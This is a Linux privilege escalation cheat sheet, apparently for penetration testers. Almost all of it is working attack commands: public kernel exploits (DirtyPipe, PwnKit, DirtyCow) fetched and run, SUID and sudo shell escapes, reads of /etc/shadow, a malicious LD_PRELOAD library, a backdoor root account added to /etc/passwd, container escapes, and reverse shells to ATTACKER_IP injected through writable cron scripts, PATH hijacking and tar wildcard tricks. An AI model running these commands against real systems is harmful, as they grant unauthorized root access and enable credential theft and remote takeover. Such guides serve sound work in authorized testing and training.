# Linux Privilege Escalation Guide

> *"Every Linux system has a path to root. Find yours."*

## Quick Enumeration

```bash
# One-liner enumeration
id; hostname; uname -a; cat /etc/*release*; sudo -l; find / -perm -4000 2>/dev/null
```

## Kernel Exploits

### Check Kernel Version
```bash
uname -r
uname -a
cat /proc/version
```

### Notable Kernel Exploits

#### DirtyPipe (CVE-2022-0847)
```bash
# Affects: Kernel 5.8 - 5.16.11, 5.15.25, 5.10.102
# Check version
uname -r | grep -E "5\.(8|9|10|11|12|13|14|15|16)"

# Exploit
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
./compile.sh
./exploit
```

#### DirtyCow (CVE-2016-5195)
```bash
# Affects: Kernel 2.x through 4.x before 4.8.3
# Check version
uname -r

# Exploit (pokemon version)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty my-new-password
su firefart
```

#### PwnKit (CVE-2021-4034)
```bash
# Affects: Polkit pkexec
# Check if vulnerable
pkexec --version

# Exploit
git clone https://github.com/ly4k/PwnKit
cd PwnKit
./PwnKit
```

#### Baron Samedit (CVE-2021-3156)
```bash
# Affects: Sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1
# Check version
sudo --version

# Check vulnerability
sudoedit -s '\' `perl -e 'print "A" x 65536'`
# If crashes, vulnerable

# Exploit
python3 exploit.py
```

### Using linux-exploit-suggester
```bash
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh -k 4.15.0
```

## SUID/SGID Binaries

### Enumeration
```bash
# Find SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both with owner
find / \( -perm -4000 -o -perm -2000 \) -exec ls -ld {} \; 2>/dev/null
```

### GTFOBins Exploitation

#### Shell Spawning
```bash
# nmap (older versions)
nmap --interactive
!sh

# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':!/bin/sh'

# less/more
!/bin/sh

# awk
awk 'BEGIN {system("/bin/sh")}'

# perl
perl -e 'exec "/bin/sh";'

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# ruby
ruby -e 'exec "/bin/sh"'

# env
env /bin/sh -p

# bash
bash -p
```

#### File Read
```bash
# base64
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode

# cat (if SUID somehow)
cat /etc/shadow

# head/tail
head -c1000 /etc/shadow
tail -c1000 /etc/shadow

# dd
dd if=/etc/shadow
```

#### File Write
```bash
# cp
cp /etc/passwd /tmp/passwd.bak
cp /tmp/malicious /target/file

# tee
echo "data" | tee /target/file

# dd
echo "data" | dd of=/target/file
```

### Custom SUID Binary Exploitation
```bash
# Check what shared libraries binary uses
ldd /path/to/suid/binary

# Check for missing libraries
strace /path/to/suid/binary 2>&1 | grep "No such file"

# Library hijacking if writable path
echo 'int __attribute__((constructor)) init() { setuid(0); system("/bin/bash -p"); }' > /tmp/exploit.c
gcc -shared -fPIC /tmp/exploit.c -o /vulnerable/lib/path/library.so
```

## Sudo Exploitation

### Enumeration
```bash
sudo -l
sudo -V
cat /etc/sudoers (if readable)
```

### Common Misconfigurations

#### Command Shell Escape
```bash
# If can run specific commands:

# vim
sudo vim -c ':!/bin/bash'

# less
sudo less /etc/passwd
!/bin/bash

# man
sudo man man
!/bin/bash

# ftp
sudo ftp
!/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# find
sudo find / -exec /bin/bash \; -quit

# nmap
sudo nmap --interactive
!sh
```

#### LD_PRELOAD
```bash
# If sudo -l shows: env_keep+=LD_PRELOAD
# Create malicious shared library
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so /allowed/command
```

#### LD_LIBRARY_PATH
```bash
# If sudo -l shows: env_keep+=LD_LIBRARY_PATH
# Find shared library used by allowed command
ldd /allowed/command

# Create malicious version
# Place in writable directory
# Set LD_LIBRARY_PATH
```

#### NOPASSWD Wildcards
```bash
# If: (ALL) NOPASSWD: /usr/bin/find *
sudo find /dev -exec /bin/bash \;

# If: (ALL) NOPASSWD: /path/to/script.sh *
# And script uses tar without full path:
echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
sudo /path/to/script.sh
```

## Cron Jobs

### Enumeration
```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# User cron
crontab -l
cat /var/spool/cron/crontabs/*

# Check cron logs
grep CRON /var/log/syslog
```

### Exploitation

#### Writable Cron Script
```bash
# If cron runs /opt/scripts/backup.sh and you can write to it:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh
```

#### PATH Injection
```bash
# If cron runs as root and script doesn't use full paths:
# Crontab: * * * * * root cd /tmp && ./cleanup.sh
# And cleanup.sh calls 'rm' without full path:

echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/rm
chmod +x /tmp/rm
# Wait for cron
```

#### Wildcard Injection
```bash
# If cron runs: tar czf /backup/backup.tar.gz *
# In the directory where * is expanded:

echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > shell.sh
```

## Capabilities

### Enumeration
```bash
getcap -r / 2>/dev/null
```

### Dangerous Capabilities

#### cap_setuid
```bash
# Python
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
./perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# Ruby
./ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

#### cap_dac_read_search
```bash
# Read any file
./tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar

# Or with gdb
./gdb -nx -ex 'python print(open("/etc/shadow").read())' -ex quit
```

#### cap_dac_override
```bash
# Write any file
./vim /etc/passwd
# Add: root2:$1$hash:0:0:root:/root:/bin/bash
```

#### cap_sys_ptrace
```bash
# Inject into process
# Find root-owned process
ps aux | grep root
# Use ptrace to inject shellcode
```

## Writable Files/Directories

### World-Writable Check
```bash
# Writable files
find / -writable -type f 2>/dev/null
find / -perm -2 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Writable in PATH
echo $PATH | tr ':' '\n' | xargs -I {} find {} -writable 2>/dev/null
```

### Dangerous Writable Files

#### /etc/passwd
```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add root user
echo 'root2:$1$xyz$hashed:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

#### /etc/shadow
```bash
# Generate hash
mkpasswd -m sha-512 password123

# Modify root password
# Replace hash in /etc/shadow for root
```

#### Service Configuration
```bash
# Writable systemd service file
vim /etc/systemd/system/service.service
# Change ExecStart to malicious binary
systemctl daemon-reload
systemctl restart service
```

## NFS Exploits

### Check NFS Shares
```bash
cat /etc/exports
showmount -e target
```

### Root Squashing Disabled
```bash
# If no_root_squash is enabled:
# Mount share as root from attacker machine
mount -t nfs target:/share /mnt

# Create SUID binary
cp /bin/bash /mnt/rootbash
chmod +s /mnt/rootbash

# On target
/share/rootbash -p
```

## Container Escapes

### Detect Container
```bash
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
hostname  # Usually random string
```

### Docker Socket Mounted
```bash
# If /var/run/docker.sock exists
ls -la /var/run/docker.sock

# Run container with host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Privileged Container
```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# If 0000003fffffffff, likely privileged

# Mount host filesystem
fdisk -l
mount /dev/sda1 /mnt
chroot /mnt
```

## Quick Reference Checklist

```
1. System Information
   [ ] uname -a
   [ ] cat /etc/*release*
   [ ] hostname

2. User Context
   [ ] id
   [ ] whoami
   [ ] groups

3. Sudo Permissions
   [ ] sudo -l

4. SUID/SGID
   [ ] find / -perm -4000 2>/dev/null
   [ ] Check GTFOBins for each

5. Capabilities
   [ ] getcap -r / 2>/dev/null

6. Cron Jobs
   [ ] cat /etc/crontab
   [ ] ls -la /etc/cron*

7. Writable Files
   [ ] find / -writable 2>/dev/null

8. Kernel Exploits
   [ ] linux-exploit-suggester.sh

9. Services
   [ ] ps aux
   [ ] netstat -tulpn

10. Password Files
    [ ] cat /etc/passwd
    [ ] cat /etc/shadow (if readable)
```
